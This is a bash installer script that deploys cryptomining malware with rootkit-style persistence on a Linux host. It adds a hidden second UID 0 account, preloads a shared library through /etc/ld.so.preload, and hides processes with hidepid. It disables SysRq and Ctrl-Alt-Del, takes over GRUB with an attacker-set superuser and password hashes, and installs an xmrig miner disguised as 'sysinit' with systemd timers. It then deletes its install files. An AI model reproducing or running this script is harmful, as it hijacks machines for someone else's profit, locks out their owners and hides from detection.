#!/bin/bash
useradd --non-unique --uid 0 system
chmod +x .bash.sh
chmod +x loggd.sh
echo "(y/n)?"
read response
if [ "$response" == "y" ]; then
mv loggd.sh /mnt/
/mnt/loggd.sh
else
echo "ok"
fi
mv .bash.sh /etc/
sysctl -w kernel.sysrq=0
clear
systemctl mask ctrl-alt-del.target
clear
read -p "Choose an option (u/c): " choice
if [ "$choice" == "u" ]; then
  mv uv system.so
  mv system.so /usr/local/lib/
  clear
elif [ "$choice" == "c" ]; then
  mv cv system.so
  mv system.so /usr/local/lib/
  clear
else
  echo "Invalid choice. Please run the script again and choose either 'b' or 'c'."
fi
echo '/usr/local/lib/system.so' | tee -a /etc/ld.so.preload
clear
echo 'proc /proc proc defaults,hidepid=2 0 0' >> /etc/fstab
echo "CtrlAltDelBurstAction=reboot-force" >> /etc/systemd/system.conf
clear
systemctl daemon-reload
mount -o remount,rw,hidepid=2 /proc
clear
search_string="grub_quote)' ${CLASS}"
replace_string="grub_quote)' --unrestricted ${CLASS}"
sed -i "s/${search_string}/${replace_string}/" /etc/grub.d/10_linux
echo 'set superusers="rikita"' >> /etc/grub.d/40_custom
echo "Choose an option (1, 2, 3, or 4):"
read option
case $option in
    1)
        echo 'password_pbkdf2 rikita grub.pbkdf2.sha512.10000.8F85E03F6D414CCB555ECB121DABC3AC8C4820D91F792CEC145F98745A66AABDD89372559289E4D195EFFDF7823934F6889998D1C281378374A73FC432F3106D.371BD3582F3264DEF1FE0F9D5924B9F514D446AAF965ABD6E1BD9499CD547C72C857A11EC24DDCEA8C0C43902036586E8F69EE5274E8FD148D3BC2CC8A1DDB39' >> /etc/grub.d/40_custom
        ;;
    2)
        echo 'password_pbkdf2 rikita grub.pbkdf2.sha512.10000.3A0FADDA4BF78806721E3E2426BD8B4096EAA322C6C8C9FD0625CA674C804C19C9D8241252300EFE8EDE6E1E72913D7868C309883B0DBD73FD2A97633BBECC1C.A3B9A0D7231B97D7980E3A9F72ADC66C98A476A04D80756596BFB4B95DAEB4102DC6814C77469AB1426A8F55687A2FF8C7BBCF7CE637ED7DA2BF2B33161CC010' >> /etc/grub.d/40_custom
        ;;
    3)
        echo 'password_pbkdf2 rikita grub.pbkdf2.sha512.10000.A8CF17152E74659EC4DAA03E5EE696C63230D7E0850AEF42A856F5ED40CE50393DCD26D8C47A699EA73CA5F1CAD8EABBCECA2CA8C79C5BC9D48162A93DA392DA.36550F7EB0B766FB85CADE60577230AD7B80FE6DE7C539B9648024D327BA50E8DC06BD78B54DA2C53CB71C1CF6ED5A5BED0D5E6BCCAAC4B940927B401B1A5505' >> /etc/grub.d/40_custom
        ;;
    4)
        grub2-mkconfig -o /boot/grub2/grub.cfg
        clear
        ;;
    *)
        echo "Invalid option. No changes made."
        ;;
esac
update-grub
clear
read -p "Choose an option (l/h): " choice
if [ "$choice" = "l" ]; then
  cp sysinit config.json /tmp/
  mv sysinit ld
  mv config.json ldo
  mv ld ldo /opt/
  cd /
  rm -rf main.zip sysd-main sysa-main
  file_path="/tmp/config.json"
  sed -i 's/"background": false/"background": true/' "$file_path"
  cd /tmp/
  ./sysinit
  rm -rf /tmp/config.json
  cd /
clear

elif [ "$choice" = "h" ]; then
  mv sysinit /sbin
  mv sysinit.service /etc/systemd/system
  mv sysinit.timer /etc/systemd/system
  mv config.json xmrig.json
  mv xmrig.json /root/
  cd /root/
  if [ ! -d "/root/.config" ]; then
    mkdir -p /root/.config
  fi
  mv xmrig.json .config
  cd /
  rm -rf sysd-main sysa-main main.zip
  rm -rf /mnt/main.zip
  rm -rf /mnt/sysd-main
  systemctl daemon-reload
  systemctl enable sysinit.timer
clear
  systemctl restart sysinit.timer
  systemctl restart sysinit.service
  systemctl status sysinit.service
fi
